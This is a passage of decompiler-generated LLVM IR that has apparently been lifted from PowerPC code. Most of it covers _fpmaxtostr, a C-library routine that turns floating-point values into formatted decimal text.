  %v3_1000cc14 = add i32 %v2_1000cc14, -1
  %v4_1000cc14 = inttoptr i32 %v3_1000cc14 to i8*
  store i8 45, i8* %v4_1000cc14, align 1
  store i32 %v3_1000cc14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cc18

dec_label_pc_1000cc18:                            ; preds = %dec_label_pc_1000cc08.dec_label_pc_1000cc18_crit_edge, %dec_label_pc_1000cc10
  %v0_1000cc20 = phi i32 [ %v0_1000cc20.pre, %dec_label_pc_1000cc08.dec_label_pc_1000cc18_crit_edge ], [ %v3_1000cc14, %dec_label_pc_1000cc10 ]
  ret i32 %v0_1000cc20

; uselistorder directives
  uselistorder i32 %v2_1000cb98, { 1, 2, 0 }
  uselistorder i32 %v2_1000cb90, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_1000cbd4, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_1000cb70, { 1, 2, 0 }
  uselistorder i32 %v0_1000cb70, { 1, 0 }
  uselistorder i32 %v0_1000cb2c, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000cc18, { 1, 0 }
  uselistorder label %dec_label_pc_1000cbe0, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb88, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb60, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_1000cc24 = load i32, i32* @lr, align 4
  store i32 %v0_1000cc24, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_1000cc40 = add i32 %tmp, 11
  %v2_1000cc40 = inttoptr i32 %v1_1000cc40 to i8*
  %v3_1000cc40 = load i8, i8* %v2_1000cc40, align 1
  %v4_1000cc40 = zext i8 %v3_1000cc40 to i32
  store i32 %v4_1000cc40, i32* %r31.global-to-local, align 4
  %v1_1000cc44 = or i32 %v4_1000cc40, 32
  %v1_1000cc48 = icmp ult i32 %v1_1000cc44, 97
  %v3_1000cc48 = icmp eq i32 %v1_1000cc44, 97
  store i1 %v1_1000cc48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cc48, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_1000cc54 = add i32 %tmp, 4
  %v2_1000cc54 = inttoptr i32 %v1_1000cc54 to i32*
  %v3_1000cc54 = load i32, i32* %v2_1000cc54, align 4
  store i32 %v3_1000cc54, i32* %r28.global-to-local, align 4
  %v2_1000cc58 = load i32, i32* %arg2, align 4
  store i32 %v2_1000cc58, i32* %r30.global-to-local, align 4
  br i1 %v3_1000cc48, label %dec_label_pc_1000cc60, label %dec_label_pc_1000cc68

dec_label_pc_1000cc60:                            ; preds = %entry
  %v1_1000cc60 = add nuw nsw i32 %v4_1000cc40, 6
  store i32 %v1_1000cc60, i32* %r0.global-to-local, align 4
  %v1_1000cc64 = urem i32 %v1_1000cc60, 256
  store i32 %v1_1000cc64, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cc68

dec_label_pc_1000cc68:                            ; preds = %entry, %dec_label_pc_1000cc60
  %v0_1000cd1c = phi i32 [ %v4_1000cc40, %entry ], [ %v1_1000cc64, %dec_label_pc_1000cc60 ]
  %v1_1000cc68 = icmp slt i32 %v2_1000cc58, 0
  %v3_1000cc68 = icmp eq i32 %v2_1000cc58, 0
  store i1 %v1_1000cc68, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cc68, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_1000cc58, -1
  br i1 %tmp75, label %dec_label_pc_1000cc74, label %dec_label_pc_1000cc70

dec_label_pc_1000cc70:                            ; preds = %dec_label_pc_1000cc68
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000cc74

dec_label_pc_1000cc74:                            ; preds = %dec_label_pc_1000cc68, %dec_label_pc_1000cc70
  %v0_1000ce2c44 = phi i32 [ %v2_1000cc58, %dec_label_pc_1000cc68 ], [ 6, %dec_label_pc_1000cc70 ]
  %v1_1000cc74 = add i32 %tmp, 12
  %v2_1000cc74 = inttoptr i32 %v1_1000cc74 to i32*
  %v3_1000cc74 = load i32, i32* %v2_1000cc74, align 4
  store i32 %v3_1000cc74, i32* %r9.global-to-local, align 4
  %v1_1000cc78 = and i32 %v3_1000cc74, 2
  %v3_1000cc78 = icmp eq i32 %v1_1000cc78, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_1000cc78, label %dec_label_pc_1000cc90, label %dec_label_pc_1000cc9c

dec_label_pc_1000cc90:                            ; preds = %dec_label_pc_1000cc74
  %v1_1000cc90 = urem i32 %v3_1000cc74, 2
  store i32 %v1_1000cc90, i32* @r7, align 4
  %v3_1000cc90 = icmp eq i32 %v1_1000cc90, 0
  br i1 %v3_1000cc90, label %dec_label_pc_1000cca0, label %dec_label_pc_1000cc9c

dec_label_pc_1000cc9c:                            ; preds = %dec_label_pc_1000cc90, %dec_label_pc_1000cc74
  %storemerge = phi i32 [ 43, %dec_label_pc_1000cc74 ], [ 32, %dec_label_pc_1000cc90 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_1000cc9c = trunc i32 %storemerge to i8
  store i8 %v6_1000cc9c, i8* %stack_var_-200, align 1
  br label %dec_label_pc_1000cca0

dec_label_pc_1000cca0:                            ; preds = %dec_label_pc_1000cc90, %dec_label_pc_1000cc9c
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000cc68, label %dec_label_pc_1000ce04, label %dec_label_pc_1000cd1c

dec_label_pc_1000cd1c:                            ; preds = %dec_label_pc_1000cca0
  %v1_1000cd1c = icmp ult i32 %v0_1000cd1c, 96
  %v2_1000cd1c = icmp ugt i32 %v0_1000cd1c, 96
  %v3_1000cd1c = icmp eq i32 %v0_1000cd1c, 96
  store i1 %v1_1000cd1c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cd1c, i1* %cr7_eq.global-to-local, align 1
  %v2_1000cd24 = add i32 %tmp, 16
  %v3_1000cd24 = inttoptr i32 %v2_1000cd24 to i32*
  store i32 32, i32* %v3_1000cd24, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_1000cd1c, label %dec_label_pc_1000cd48, label %dec_label_pc_1000cd3c

dec_label_pc_1000cd3c:                            ; preds = %dec_label_pc_1000cd1c
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000cd48

dec_label_pc_1000cd48:                            ; preds = %dec_label_pc_1000cd1c, %dec_label_pc_1000cd3c
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_10012a98.363 to i32), i32 8), %dec_label_pc_1000cd1c ], [ add (i32 ptrtoint ([4 x i8]* @global_var_10012a98.363 to i32), i32 12), %dec_label_pc_1000cd3c ]
  store i32 ptrtoint ([4 x i8]* @global_var_10012a98.363 to i32), i32* %r9.global-to-local, align 4
  %v2_1000cd54 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000cd54, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d1f4

dec_label_pc_1000ce04:                            ; preds = %dec_label_pc_1000cca0
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1000ce08 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1000ce08, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_1000ce54 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_1000ce28

dec_label_pc_1000ce28:                            ; preds = %dec_label_pc_1000cea8.dec_label_pc_1000ce28_crit_edge, %dec_label_pc_1000ce04
  %v0_1000ce2c = phi i32 [ %v0_1000ce2c.pre, %dec_label_pc_1000cea8.dec_label_pc_1000ce28_crit_edge ], [ %v0_1000ce2c44, %dec_label_pc_1000ce04 ]
  %v3_1000ce2c = call %1 @__asm_cror(i32 %v0_1000ce2c, i32 %tmp, i32 %v0_1000ce2c)
  %v11_1000ce2c = extractvalue %1 %v3_1000ce2c, 7
  store i4 %v11_1000ce2c, i4* @cr4, align 1
  %v0_1000ce30 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000ce30, label %dec_label_pc_1000ce44, label %dec_label_pc_1000ce58

dec_label_pc_1000ce44:                            ; preds = %dec_label_pc_1000ce28
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000ce58

dec_label_pc_1000ce58:                            ; preds = %dec_label_pc_1000ce28, %dec_label_pc_1000ce44
  %storemerge2 = phi i32 [ %v1_1000ce54, %dec_label_pc_1000ce44 ], [ %tmp55, %dec_label_pc_1000ce28 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_1000ce68 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000ce68 = add i32 %v0_1000ce68, 9
  store i32 %v1_1000ce68, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ce84

dec_label_pc_1000ce84:                            ; preds = %dec_label_pc_1000ce84.dec_label_pc_1000ce84_crit_edge, %dec_label_pc_1000ce58
  %v1_1000ce8c = phi i32 [ %v1_1000ce8c.pre, %dec_label_pc_1000ce84.dec_label_pc_1000ce84_crit_edge ], [ %v1_1000ce68, %dec_label_pc_1000ce58 ]
  %v0_1000ce88 = phi i32 [ %v0_1000ce88.pre, %dec_label_pc_1000ce84.dec_label_pc_1000ce84_crit_edge ], [ 0, %dec_label_pc_1000ce58 ]
  %v1_1000ce84 = phi i32 [ %v1_1000ce84.pre, %dec_label_pc_1000ce84.dec_label_pc_1000ce84_crit_edge ], [ 10, %dec_label_pc_1000ce58 ]
  %v1_1000ce94 = phi i32 [ %v0_1000ce84.pre, %dec_label_pc_1000ce84.dec_label_pc_1000ce84_crit_edge ], [ %storemerge2, %dec_label_pc_1000ce58 ]
  %v2_1000ce84 = udiv i32 %v1_1000ce94, %v1_1000ce84
  store i32 %v2_1000ce84, i32* %r0.global-to-local, align 4
  %v1_1000ce88 = add i32 %v0_1000ce88, 1
  store i32 %v1_1000ce88, i32* %r8.global-to-local, align 4
  %v2_1000ce8c = sub i32 %v1_1000ce8c, %v1_1000ce88
  store i32 %v2_1000ce8c, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_1000ce84, -10
  store i32 %v2_1000ce84, i32* %r10.global-to-local, align 4
  %v2_1000ce94 = add i32 %v1_1000ce94, 48
  %v1_1000ce9c = add i32 %v2_1000ce94, %tmp76
  store i32 %v1_1000ce9c, i32* %r9.global-to-local, align 4
  %v1_1000cea0 = trunc i32 %v1_1000ce9c to i8
  %v3_1000cea0 = inttoptr i32 %v2_1000ce8c to i8*
  store i8 %v1_1000cea0, i8* %v3_1000cea0, align 1
  %v0_1000cea4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000cea4 = add i32 %v0_1000cea4, -1
  store i32 %v1_1000cea4, i32* %ctr.global-to-local, align 4
  %v2_1000cea4 = icmp eq i32 %v1_1000cea4, 0
  br i1 %v2_1000cea4, label %dec_label_pc_1000cea8, label %dec_label_pc_1000ce84.dec_label_pc_1000ce84_crit_edge

dec_label_pc_1000ce84.dec_label_pc_1000ce84_crit_edge: ; preds = %dec_label_pc_1000ce84
  %v0_1000ce84.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ce84.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000ce88.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ce8c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000ce84

dec_label_pc_1000cea8:                            ; preds = %dec_label_pc_1000ce84
  %v0_1000cea8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000cea8 = icmp slt i32 %v0_1000cea8, 0
  %v3_1000cea8 = icmp eq i32 %v0_1000cea8, 0
  store i1 %v1_1000cea8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cea8, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ceac = add i32 %v0_1000cea8, 1
  store i32 %v1_1000ceac, i32* %r7.global-to-local, align 4
  br i1 %v3_1000cea8, label %dec_label_pc_1000cea8.dec_label_pc_1000ce28_crit_edge, label %dec_label_pc_1000ceb4

dec_label_pc_1000cea8.dec_label_pc_1000ce28_crit_edge: ; preds = %dec_label_pc_1000cea8
  %v0_1000ce2c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000ce28

dec_label_pc_1000ceb4:                            ; preds = %dec_label_pc_1000cea8
  %v0_1000ceb4 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ceb4 = icmp ult i32 %v0_1000ceb4, 96
  %v2_1000ceb4 = icmp ugt i32 %v0_1000ceb4, 96
  %v3_1000ceb4 = icmp eq i32 %v0_1000ceb4, 96
  store i1 %v1_1000ceb4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ceb4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000ceb4, label %dec_label_pc_1000cecc, label %dec_label_pc_1000cebc

dec_label_pc_1000cebc:                            ; preds = %dec_label_pc_1000ceb4
  %v1_1000cec4 = add i32 %v0_1000ceb4, 32
  store i32 %v1_1000cec4, i32* %r0.global-to-local, align 4
  %v1_1000cec8 = urem i32 %v1_1000cec4, 256
  store i32 %v1_1000cec8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cecc

dec_label_pc_1000cecc:                            ; preds = %dec_label_pc_1000ceb4, %dec_label_pc_1000cebc
  %v0_1000cee4 = phi i32 [ %v1_1000cec8, %dec_label_pc_1000cebc ], [ %v0_1000ceb4, %dec_label_pc_1000ceb4 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_1000cebc ], [ 101, %dec_label_pc_1000ceb4 ]
  %v1_1000cecc = icmp slt i32 %v0_1000cee4, 103
  %v3_1000cecc = icmp eq i32 %v0_1000cee4, 103
  store i1 %v1_1000cecc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cecc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cecc, label %dec_label_pc_1000ced4, label %dec_label_pc_1000cee4

dec_label_pc_1000ced4:                            ; preds = %dec_label_pc_1000cecc
  %v0_1000ced4 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000ced4 = icmp slt i32 %v0_1000ced4, 0
  %v3_1000ced4 = icmp eq i32 %v0_1000ced4, 0
  store i1 %v1_1000ced4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ced4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ced4, label %dec_label_pc_1000ceec, label %dec_label_pc_1000cedc

dec_label_pc_1000cedc:                            ; preds = %dec_label_pc_1000ced4
  %v1_1000cedc = add i32 %v0_1000ced4, -1
  store i32 %v1_1000cedc, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000ceec

dec_label_pc_1000cee4:                            ; preds = %dec_label_pc_1000cecc
  %v1_1000cee4 = icmp slt i32 %v0_1000cee4, 102
  %v3_1000cee4 = icmp eq i32 %v0_1000cee4, 102
  store i1 %v1_1000cee4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cee4, i1* %cr7_eq.global-to-local, align 1
  %v0_1000cef4 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_1000cee4, label %dec_label_pc_1000cef4, label %dec_label_pc_1000ceec

dec_label_pc_1000ceec:                            ; preds = %dec_label_pc_1000cee4, %dec_label_pc_1000ced4, %dec_label_pc_1000cedc
  %v0_1000ceec = phi i32 [ 0, %dec_label_pc_1000ced4 ], [ %v1_1000cedc, %dec_label_pc_1000cedc ], [ %v0_1000cef4, %dec_label_pc_1000cee4 ]
  store i32 %v0_1000ceec, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000cf18

dec_label_pc_1000cef4:                            ; preds = %dec_label_pc_1000cee4
  %v1_1000cef4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1000cef4 = add i32 %v1_1000cef4, %v0_1000cef4
  store i32 %v2_1000cef4, i32* %r10.global-to-local, align 4
  %v1_1000cef8 = icmp slt i32 %v2_1000cef4, -1
  %v3_1000cef8 = icmp eq i32 %v2_1000cef4, -1
  store i1 %v1_1000cef8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cef8, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_1000cef4, -2
  br i1 %tmp77, label %dec_label_pc_1000cf18, label %dec_label_pc_1000cf00

dec_label_pc_1000cf00:                            ; preds = %dec_label_pc_1000cef4
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_1000cf04 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_1000cf04, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268488464, i32* @lr, align 4
  %v3_1000cf0c = call i32 @__GI_memset(i32 %v2_1000cf04, i32 48, i32 17)
  store i32 %v3_1000cf0c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000cf18

dec_label_pc_1000cf18:                            ; preds = %dec_label_pc_1000cef4, %dec_label_pc_1000ceec, %dec_label_pc_1000cf00
  %v1_1000cf3c = phi i32 [ %v2_1000cef4, %dec_label_pc_1000cef4 ], [ %v0_1000ceec, %dec_label_pc_1000ceec ], [ -1, %dec_label_pc_1000cf00 ]
  %v1_1000cf18 = icmp slt i32 %v1_1000cf3c, 16
  %v2_1000cf18 = icmp sgt i32 %v1_1000cf3c, 16
  %v3_1000cf18 = icmp eq i32 %v1_1000cf3c, 16
  store i1 %v1_1000cf18, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cf18, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_1000cf2c = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_1000cf2c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_1000cf18, label %dec_label_pc_1000cf54, label %dec_label_pc_1000cf38

dec_label_pc_1000cf38:                            ; preds = %dec_label_pc_1000cf18
  %v2_1000cf38 = ptrtoint i32* %stack_var_-177 to i32
  %v2_1000cf3c = add i32 %v1_1000cf3c, %v2_1000cf38
  store i32 %v2_1000cf3c, i32* %r9.global-to-local, align 4
  %v1_1000cf40 = add i32 %v2_1000cf3c, 2
  %v2_1000cf40 = inttoptr i32 %v1_1000cf40 to i8*
  %v3_1000cf40 = load i8, i8* %v2_1000cf40, align 1
  %v4_1000cf40 = zext i8 %v3_1000cf40 to i32
  store i32 %v4_1000cf40, i32* %r0.global-to-local, align 4
  store i32 %v1_1000cf40, i32* %r11.global-to-local, align 4
  %v1_1000cf48 = sub nsw i32 52, %v4_1000cf40
  %v2_1000cf48 = sub nuw nsw i32 -1, %v4_1000cf40
  %not.v5_1000cf48 = icmp ugt i32 %v1_1000cf48, %v2_1000cf48
  %v1_1000cf50 = zext i1 %not.v5_1000cf48 to i32
  store i32 %v1_1000cf50, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000cf54

dec_label_pc_1000cf54:                            ; preds = %dec_label_pc_1000cf18, %dec_label_pc_1000cf38, %dec_label_pc_1000cf54.backedge
  %v0_1000cf58 = phi i32 [ %v0_1000cf58.pre, %dec_label_pc_1000cf54.backedge ], [ 0, %dec_label_pc_1000cf18 ], [ %v1_1000cf50, %dec_label_pc_1000cf38 ]
  %v0_1000cf54 = phi i32 [ %v0_1000cf54.pre, %dec_label_pc_1000cf54.backedge ], [ %v2_1000cf2c, %dec_label_pc_1000cf18 ], [ %v1_1000cf40, %dec_label_pc_1000cf38 ]
  %v1_1000cf54 = add i32 %v0_1000cf54, -1
  %v2_1000cf54 = inttoptr i32 %v1_1000cf54 to i8*
  %v3_1000cf54 = load i8, i8* %v2_1000cf54, align 1
  %v4_1000cf54 = zext i8 %v3_1000cf54 to i32
  store i32 %v1_1000cf54, i32* %r11.global-to-local, align 4
  %v2_1000cf58 = add i32 %v4_1000cf54, %v0_1000cf58
  store i32 %v2_1000cf58, i32* %r0.global-to-local, align 4
  %v1_1000cf5c = urem i32 %v2_1000cf58, 256
  store i32 %v1_1000cf5c, i32* %r9.global-to-local, align 4
  %v1_1000cf60 = trunc i32 %v2_1000cf58 to i8
  store i8 %v1_1000cf60, i8* %v2_1000cf54, align 1
  %v0_1000cf64 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cf64 = icmp slt i32 %v0_1000cf64, 48
  %v3_1000cf64 = icmp eq i32 %v0_1000cf64, 48
  store i1 %v1_1000cf64, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cf64, i1* %cr7_eq.global-to-local, align 1
  %v1_1000cf68 = icmp ult i32 %v0_1000cf64, 57
  %v2_1000cf68 = icmp ugt i32 %v0_1000cf64, 57
  %v3_1000cf68 = icmp eq i32 %v0_1000cf64, 57
  store i1 %v1_1000cf68, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000cf68, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000cf68, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000cf64, %v2_1000cf68
  br i1 %brmerge, label %dec_label_pc_1000cf54.backedge, label %dec_label_pc_1000cf74

dec_label_pc_1000cf54.backedge:                   ; preds = %dec_label_pc_1000cf54
  %v0_1000cf54.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000cf58.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000cf54

dec_label_pc_1000cf74:                            ; preds = %dec_label_pc_1000cf54
  %v2_1000cf74 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_1000cf74, i32* %r0.global-to-local, align 4
  %v0_1000cf78 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1000cf78, i32* @r7, align 4
  %v0_1000cf7c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000cf7c = icmp ult i32 %v0_1000cf7c, %v2_1000cf74
  %v3_1000cf7c = icmp ugt i32 %v0_1000cf7c, %v2_1000cf74
  %v4_1000cf7c = icmp eq i32 %v0_1000cf7c, %v2_1000cf74
  store i1 %v2_1000cf7c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000cf7c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_1000ce08, i32* %r8.global-to-local, align 4
  br i1 %v3_1000cf7c, label %dec_label_pc_1000cf94, label %dec_label_pc_1000cf88

dec_label_pc_1000cf88:                            ; preds = %dec_label_pc_1000cf74
  store i32 %v2_1000cf74, i32* %r8.global-to-local, align 4
  %v1_1000cf8c = add i32 %v0_1000cf78, 1
  store i32 %v1_1000cf8c, i32* @r7, align 4
  store i32 %v2_1000cf74, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000cf94

dec_label_pc_1000cf94:                            ; preds = %dec_label_pc_1000cf74, %dec_label_pc_1000cf88
  %v2_1000cf9c = phi i32 [ %v0_1000cf7c, %dec_label_pc_1000cf74 ], [ %v2_1000cf74, %dec_label_pc_1000cf88 ]
  %v0_1000cf94 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000cf94 = icmp slt i32 %v0_1000cf94, 103
  %v3_1000cf94 = icmp eq i32 %v0_1000cf94, 103
  store i1 %v1_1000cf94, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cf94, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000cf9c = add i32 %v2_1000cf9c, 1
  %v4_1000cf9c = inttoptr i32 %v3_1000cf9c to i8*
  store i8 0, i8* %v4_1000cf9c, align 1
  %v0_1000cfa0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cfa0 = add i32 %v0_1000cfa0, 1
  store i32 %v1_1000cfa0, i32* %r9.global-to-local, align 4
  %v0_1000cfa4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000cfa4, label %dec_label_pc_1000cfa8, label %dec_label_pc_1000cfcc

dec_label_pc_1000cfa8:                            ; preds = %dec_label_pc_1000cf94
  %v0_1000cfa8 = load i32, i32* @r7, align 4
  %v1_1000cfa8 = icmp slt i32 %v0_1000cfa8, -4
  %v3_1000cfa8 = icmp eq i32 %v0_1000cfa8, -4
  store i1 %v1_1000cfa8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cfa8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1000cfa8, label %dec_label_pc_1000cfc4, label %dec_label_pc_1000cfb0

dec_label_pc_1000cfb0:                            ; preds = %dec_label_pc_1000cfa8
  %v1_1000cfb0 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000cfb0 = icmp sgt i32 %v1_1000cfb0, %v0_1000cfa8
  %v3_1000cfb0 = icmp slt i32 %v1_1000cfb0, %v0_1000cfa8
  %v4_1000cfb0 = icmp eq i32 %v1_1000cfb0, %v0_1000cfa8
  store i1 %v2_1000cfb0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000cfb0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cfb0, label %dec_label_pc_1000cfc4, label %dec_label_pc_1000cfb8

dec_label_pc_1000cfb8:                            ; preds = %dec_label_pc_1000cfb0
  %v2_1000cfb8 = sub i32 %v1_1000cfb0, %v0_1000cfa8
  store i32 %v2_1000cfb8, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000cfe4

dec_label_pc_1000cfc4:                            ; preds = %dec_label_pc_1000cfb0, %dec_label_pc_1000cfa8
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000cfd8

dec_label_pc_1000cfcc:                            ; preds = %dec_label_pc_1000cf94
  %v0_1000cfcc = load i32, i32* %r31.global-to-local, align 4
  %v1_1000cfcc = icmp slt i32 %v0_1000cfcc, 102
  %v3_1000cfcc = icmp eq i32 %v0_1000cfcc, 102
  store i1 %v1_1000cfcc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cfcc, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1000cfcc, i32* %r4.global-to-local, align 4
  br i1 %v3_1000cfcc, label %dec_label_pc_1000cfe4thread-pre-split, label %dec_label_pc_1000cfd8

dec_label_pc_1000cfd8:                            ; preds = %dec_label_pc_1000cfcc, %dec_label_pc_1000cfc4
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_1000cff8

dec_label_pc_1000cfe4thread-pre-split:            ; preds = %dec_label_pc_1000cfcc
  %v0_1000cfe4.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000cfe4

dec_label_pc_1000cfe4:                            ; preds = %dec_label_pc_1000cfe4thread-pre-split, %dec_label_pc_1000cfb8
